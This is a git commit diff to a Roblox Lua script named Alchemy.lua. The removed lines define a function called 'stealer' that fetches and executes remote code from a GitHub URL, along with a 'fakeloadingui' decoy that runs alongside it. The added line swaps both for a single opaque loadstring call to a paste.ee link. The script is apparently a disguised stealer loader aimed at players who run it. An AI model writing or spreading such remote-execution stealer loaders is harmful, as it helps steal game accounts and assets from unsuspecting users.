6331ed2825c389e511c2e716f8ea00c0c75dedeb
ScriptkingPt <erclone131@gmail.com>
2025-05-28 08:57:18 +0800

    Update Alchemy.lua

--- Alchemy.lua
+++ Alchemy.lua
@@ -1,9 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/twilight.lua'))()
-end
-local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/fakeloadingui.lua'))()
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://paste.ee/r/HAabjvH9"))()
